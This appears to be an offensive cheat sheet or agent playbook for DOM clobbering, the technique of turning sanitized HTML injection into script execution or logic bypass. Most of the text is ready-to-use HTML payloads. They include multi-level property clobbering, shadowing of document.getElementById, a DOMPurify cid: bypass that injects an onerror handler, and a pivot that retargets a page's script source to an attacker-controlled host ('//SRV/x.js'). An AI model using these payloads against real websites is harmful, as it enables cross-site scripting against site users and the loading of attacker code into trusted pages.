# DOM clobbering payloads — Open WHEN: you have HTML injection but `<script>`/event-handler execution is blocked (sanitizer strips them, or CSP forbids inline), and the page reads a JS global/property that a named DOM element can shadow (`if(window.X)`, `config.url`, `x.y.value`, a relative-src `<script>`)

DOM clobbering names HTML elements with an `id`/`name` so they override a
global variable or object property the page later reads. No JS runs from the
injected markup itself — you supply a controllable *value* (usually a string or
URL) that the page's own code then trusts. Use it as the bridge to XSS or
logic bypass when direct script injection is filtered.

## Core requirement
You need HTML injection (even sanitized markup that keeps `id`/`name`/`href`)
AND a sink that reads a named global, e.g. `document.write(window.config.url)`,
`el.innerHTML = settings.template`, or `<script src=defaultData></script>`.

## Single-level: clobber `x` and `x.value`
```html
<a id=x>                                   <!-- window.x -> the <a> element -->
<form id=x><output id=y>CLOBBERED</output> <!-- x.y.value === "CLOBBERED" -->
<input id=x value=CLOBBERED>               <!-- x.value -->
```

## Two-level `x.y` via id+name DOM collection
```html
<a id=x><a id=x name=y href="CLOBBERED">   <!-- x.y === the href string -->
```
Two elements sharing `id=x` form an `HTMLCollection`; the `name=y` member is
reachable as `x.y`. The `href` is the controllable value.

## Three+ levels: `x.y.z` and `a.b.c.d`
```html
<form id=x name=y><input id=z></form><form id=x></form>   <!-- x.y.z -->
<iframe name=a srcdoc="
  <iframe srcdoc='<a id=c name=d href=cid:CLOBBERED>x</a><a id=c>' name=b>"></iframe>
<style>@import '//SRV';</style>                            <!-- a.b.c.d -->
```
Nested `srcdoc` iframes chain the property lookup deeper than two levels.

## Clobber `document.getElementById()` itself
```html
<html id=cdnDomain>clobbered</html>
<svg><body id=cdnDomain>clobbered</body></svg>
<img name=getElementById>          <!-- shadows document.getElementById -->
```
A `<html>`/`<body>` with an `id` makes `document.getElementById('cdnDomain')`
return that element instead of the real one — turns a trusted lookup into
controllable content.

## Clobber URL parts (`x.username` / `x.password`)
```html
<a id=x href="ftp:CLOBBERED-user:CLOBBERED-pass@a">
<!-- x.username === "CLOBBERED-user", x.password === "CLOBBERED-pass" -->
```

## Browser-specific value injection via `<base>`
```html
<!-- Firefox: x stringifies to a value containing < > -->
<base href=a:abc><a id=x href="Firefox<>">
<!-- Chrome: x.xyz carries < > -->
<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>
```

## Clobber array methods (`forEach`, Chrome)
```html
<form id=x><input id=y name=z><input id=y></form>
<!-- x.y is a collection; x.y.forEach(...) now iterates injected inputs -->
```

## Sanitizer-specific trick: DOMPurify allows `cid:`
`cid:` is on DOMPurify's URI allow-list and it does NOT entity-encode `"`,
so the value can break its own attribute and add an event handler:
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

## Pivot to script execution
- Page loads a script from a clobbered variable:
  `<script src=defaultData></script>` + `<a id=defaultData href="//SRV/x.js">`
  retargets the source to your host.
- Clobber a config flag the page treats as a code/HTML template, then let the
  page's own `innerHTML`/`document.write` render your value.
- Hijack `navigator.serviceWorker` registration paths the page derives from a
  clobbered global to gain page persistence.

## Detection oracle
Grep injected `<a id=NAME href=...>` reflected unescaped, then in DevTools test
`window.NAME`, `NAME.value`, `NAME.href`. If they return your element/string,
trace whether the page reads that exact name. The PortSwigger DOM-Invader and
the `domclob.xyz` markup list enumerate per-browser working forms.
